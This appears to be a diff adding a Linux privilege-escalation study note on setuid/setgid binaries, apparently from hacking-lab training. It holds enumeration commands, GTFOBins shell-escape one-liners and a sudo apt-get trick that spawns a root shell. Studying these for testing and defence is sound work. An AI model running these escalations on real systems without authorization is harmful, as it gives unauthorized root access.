@@ -1,0 +1,80 @@
+🛡️ Special Permissions – setuid & setgid
+📁 Path: linux-priv-esc/special-permissions.md
+
+🧠 What’s This About?
+Certain binaries can run with elevated privileges regardless of the executing user's privileges, thanks to special permission bits:
+
+Bit	Purpose	Symbol
+setuid	Run binary as file owner	s in user perms (e.g. -rwsr-xr-x)
+setgid	Run binary as file group	s in group perms (e.g. -rwxr-sr-x)
+🔍 Key Enumeration Commands
+🔹 Find all setuid binaries (run as root):
+bash
+Copy
+Edit
+find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+🔹 Find all setgid binaries (run as group):
+bash
+Copy
+Edit
+find / -perm -6000 -type f 2>/dev/null
+🔹 Shortcut: Find any interesting SUID-root binary not default:
+bash
+Copy
+Edit
+find / -perm -4000 -type f 2>/dev/null | grep -vE "/(bin|sbin|usr)/(bin|sbin)/"
+🧨 Why It Matters
+If any SUID binary is:
+
+Custom (e.g. /home/user/payroll)
+
+Has debug mode, execs commands, or
+
+Is in GTFOBins...
+
+…it could be a path to root.
+
+⚙️ Real Example
+bash
+Copy
+Edit
+-rwsr-xr-x 1 root root 16728 /home/htb-student/shared_obj_hijack/payroll
+This custom binary runs as root. If it has a vuln (e.g., improper library loading, buffer overflow, command exec), it’s game over.
+
+👉 Reverse engineer with strings, ltrace, strace, or Ghidra.
+
+🧠 GTFOBins Pro Tip
+Many legit binaries with SUID set are abusable using GTFO techniques.
+
+Examples to remember:
+
+Binary	GTFOBin Trick
+find	find . -exec /bin/sh \;
+less	less /etc/passwd, then press !sh
+awk	awk 'BEGIN {system("/bin/sh")}'
+vim	vim -c ':!sh'
+env	env /bin/sh
+perl	perl -e 'exec "/bin/sh";'
+python	python -c 'import os; os.system("/bin/sh")'
+💡 Bonus: apt-get Priv-Esc with Sudo
+(when allowed via sudo -l)
+
+bash
+Copy
+Edit
+sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+👆 Spawns root shell if misconfigured in sudoers.
+
+🧬 Post-Exploitation Checklist (SUID/SGID)
+✅ find / -perm -4000 -type f
+✅ Check with GTFOBins
+✅ Use strings, ltrace, strace on custom binaries
+✅ Look for exec() usage or writable libs
+✅ Check for LD_PRELOAD, LD_LIBRARY_PATH vulns
+✅ Check sudoers with sudo -l for privileged command wrappers
+
+🧪 Testable One-Liner for GTFO Matches:
+bash
+Copy
+Edit
+for bin in $(find / -perm -4000 -type f 2>/dev/null); do echo "[*] $bin"; strings $bin | grep -i "exec" && echo "==> POTENTIALLY DANGEROUS"; done
